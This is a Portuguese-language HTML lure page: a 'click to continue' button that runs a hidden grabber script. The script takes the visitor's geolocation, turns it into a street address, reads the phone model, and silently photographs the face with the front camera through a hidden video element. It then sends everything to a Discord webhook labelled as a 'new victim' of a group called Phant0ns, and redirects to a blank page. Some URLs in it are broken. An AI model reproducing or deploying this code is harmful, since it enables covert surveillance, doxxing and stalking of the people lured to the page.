   <!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aguarde...</title>
    <style>
        body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
        .vermelho { color: red; font-weight: bold; font-size: 26px; }
        .verde { color: #00ff00; font-weight: bold; font-size: 22px; }
        #btn { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #222; color: white; border: 1px solid #444; border-radius: 8px; margin-top: 20px; }
    </style>
</head>
<body>

    <div id="m" style="display:none;">
        <p class="vermelho">TEXTO TEXTO TEXTO</p>
        <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
        <p>TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
    </div>

    <button id="btn">CLIQUE PARA CONTINUAR</button>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const WEBHOOK = 'https://discord.com';

        document.getElementById('btn').addEventListener('click', async () => {
            document.getElementById('m').style.display = 'block';
            document.getElementById('btn').style.display = 'none';

            try {
                // 1. Captura de Localização (Endereço Escrito)
                const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                const resEnd = await fetch(`https://openstreetmap.org{p.coords.latitude}&lon=${p.coords.longitude}`);
                const dEnd = await resEnd.json();
                const endereco = dEnd.display_name || "Endereço não identificado";

                // 2. Modelo do Celular
                const modelo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Desconhecido";

                // 3. Captura de Foto (Apenas Frontal/Rosto)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1500)); // Tempo para focar
                
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const foto = canvas.toDataURL('image/jpeg');
                
                stream.getTracks().forEach(t => t.stop());

                // 4. Montar e Enviar para o Discord
                const fd = new FormData();
                fd.append('payload_json', JSON.stringify({
                    content: "NOVA VÍTIMA DOS PHANT0NS 😈😈😈😈",
                    embeds: [{
                        title: "DADOS COLETADOS",
                        description: `📍 **LOCALIZAÇÃO:**\n${endereco}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📱 **MODELO CELULAR:**\n${modelo}\n\nphant0ns 😈`,
                        color: 16711680,
                        image: { url: 'attachment://rosto.jpg' }
                    }]
                }));
                
                const blob = await (await fetch(foto)).blob();
                fd.append('file', blob, 'rosto.jpg');

                await fetch(WEBHOOK, { method: 'POST', body: fd });
                
                // Redireciona para sair da tela
                setTimeout(() => { window.location.href = "about:blank"; }, 2000);

            } catch (e) {
                console.log(e);
                setTimeout(() => { window.location.href = "about:blank"; }, 1000);
            }
        });
    </script>
</body>
</html>
